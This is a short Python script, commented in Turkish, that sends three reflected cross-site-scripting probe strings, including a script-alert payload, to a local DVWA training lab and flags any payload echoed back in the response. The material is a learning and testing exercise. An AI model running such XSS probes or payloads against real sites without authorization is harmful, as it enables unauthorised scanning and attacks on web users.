import requests
#Cookie bilgisi sizde farklılık gösterebilir.
header={"Cookie": "security=low; PHPSESSID=0639ced4e3b12926d1508f2dcf117b00"}
xss_liste=["siber","<h1>siber","<script>alert('siber')</script>"]
for payload in xss_liste:
    print(payload)
    url="http://192.168.91.128/dvwa/vulnerabilities/xss_r/?name="+str(payload)
    sonuc=requests.get(url=url,headers=header)
    if str(payload) in str(sonuc.content):
        print("XSS olabilir: ", str(payload))